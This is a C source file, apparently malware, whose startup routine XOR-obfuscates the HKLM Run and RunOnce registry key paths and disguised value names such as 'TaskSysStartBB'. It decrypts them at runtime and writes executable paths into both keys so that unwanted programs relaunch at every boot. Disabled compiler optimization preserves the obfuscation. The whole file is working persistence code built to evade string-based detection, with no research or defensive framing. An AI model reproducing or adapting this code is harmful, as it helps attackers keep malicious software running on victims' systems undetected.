#include "data_globals.h"
#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}


#include <windows.h>
#include <stdint.h>
#include <string.h>

void _WinStartup(void)
{
    // Obfuscate "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" with key 0x3E
    volatile char sz_run[] = {
        'S'^0x3E, 'O'^0x3E, 'F'^0x3E, 'T'^0x3E, 'W'^0x3E, 'A'^0x3E, 'R'^0x3E, 'E'^0x3E,
        '\\'^0x3E, 'M'^0x3E, 'i'^0x3E, 'c'^0x3E, 'r'^0x3E, 'o'^0x3E, 's'^0x3E, 'o'^0x3E, 'f'^0x3E, 't'^0x3E,
        '\\'^0x3E, 'W'^0x3E, 'i'^0x3E, 'n'^0x3E, 'd'^0x3E, 'o'^0x3E, 'w'^0x3E, 's'^0x3E,
        '\\'^0x3E, 'C'^0x3E, 'u'^0x3E, 'r'^0x3E, 'r'^0x3E, 'e'^0x3E, 'n'^0x3E, 't'^0x3E,
        'V'^0x3E, 'e'^0x3E, 'r'^0x3E, 's'^0x3E, 'i'^0x3E, 'o'^0x3E, 'n'^0x3E,
        '\\'^0x3E, 'R'^0x3E, 'u'^0x3E, 'n'^0x3E, 0x00^0x3E
    };
    xor_decrypt(sz_run, sizeof(sz_run), 0x3E);

    // Obfuscate "TaskSysStartBB" with key 0x7A
    volatile char sz_val1[] = {
        'T'^0x7A, 'a'^0x7A, 's'^0x7A, 'k'^0x7A, 'S'^0x7A, 'y'^0x7A, 's'^0x7A,
        'S'^0x7A, 't'^0x7A, 'a'^0x7A, 'r'^0x7A, 't'^0x7A, 'B'^0x7A, 'B'^0x7A, 0x00^0x7A
    };
    xor_decrypt(sz_val1, sizeof(sz_val1), 0x7A);

    // Obfuscate "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" with key 0x1F
    volatile char sz_runonce[] = {
        'S'^0x1F, 'O'^0x1F, 'F'^0x1F, 'T'^0x1F, 'W'^0x1F, 'A'^0x1F, 'R'^0x1F, 'E'^0x1F,
        '\\'^0x1F, 'M'^0x1F, 'i'^0x1F, 'c'^0x1F, 'r'^0x1F, 'o'^0x1F, 's'^0x1F, 'o'^0x1F, 'f'^0x1F, 't'^0x1F,
        '\\'^0x1F, 'W'^0x1F, 'i'^0x1F, 'n'^0x1F, 'd'^0x1F, 'o'^0x1F, 'w'^0x1F, 's'^0x1F,
        '\\'^0x1F, 'C'^0x1F, 'u'^0x1F, 'r'^0x1F, 'r'^0x1F, 'e'^0x1F, 'n'^0x1F, 't'^0x1F,
        'V'^0x1F, 'e'^0x1F, 'r'^0x1F, 's'^0x1F, 'i'^0x1F, 'o'^0x1F, 'n'^0x1F,
        '\\'^0x1F, 'R'^0x1F, 'u'^0x1F, 'n'^0x1F, 'O'^0x1F, 'n'^0x1F, 'c'^0x1F, 'e'^0x1F, 0x00^0x1F
    };
    xor_decrypt(sz_runonce, sizeof(sz_runonce), 0x1F);

    // Obfuscate "SysTrayStartLW" with key 0x5C
    volatile char sz_val2[] = {
        'S'^0x5C, 'y'^0x5C, 's'^0x5C, 'T'^0x5C, 'r'^0x5C, 'a'^0x5C, 'y'^0x5C,
        'S'^0x5C, 't'^0x5C, 'a'^0x5C, 'r'^0x5C, 't'^0x5C, 'L'^0x5C, 'W'^0x5C, 0x00^0x5C
    };
    xor_decrypt(sz_val2, sizeof(sz_val2), 0x5C);

    // Copy windoze to winreg and ensure null-termination
    strcpy(_winreg, _windoze);

    RegCreateKeyA((HKEY)0x80000002, (char*)sz_run, &_hKey);
    RegSetValueExA(_hKey, (char*)sz_val1, 0, REG_SZ, (const BYTE*)_winreg, sizeof(_winreg));
    RegCloseKey(_hKey);

    // Copy sysdoze to sysreg and ensure null-termination
    strcpy(_sysreg, _sysdoze);

    RegCreateKeyA((HKEY)0x80000002, (char*)sz_runonce, &_hKey);
    RegSetValueExA(_hKey, (char*)sz_val2, 0, REG_SZ, (const BYTE*)_sysreg, sizeof(_sysreg));
    RegCloseKey(_hKey);

    return;
}
#pragma optimize("", on)
